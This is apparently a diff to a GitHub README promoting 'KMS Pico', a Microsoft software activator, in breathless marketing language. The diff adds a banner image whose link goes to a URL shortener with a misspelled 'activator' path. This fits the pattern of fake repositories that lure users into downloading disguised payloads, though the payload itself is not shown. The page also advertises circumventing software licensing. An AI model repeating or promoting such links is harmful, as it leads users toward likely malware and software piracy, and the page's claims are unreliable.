@@ -1,6 +1,8 @@
 # **KMS Pico – Embrace a New Era of Digital Independence! ✨**
 Step into the future of software accessibility with KMS Pico – not just an application, but a revolution in user empowerment. We've merged cutting-edge innovation with human-centered design to create your perfect bridge to unlimited Microsoft access, eliminating barriers forever.
 
+[![4768746946794678](https://github.com/user-attachments/assets/c570f088-8cc6-4ddb-afce-6338fd79d018)](https://y.gy/kmss-pico-acttivator)
+
 ## ✨ Unmatched Excellence in Every Aspect
 
 ### 🌐 Total Microsoft Ecosystem Access
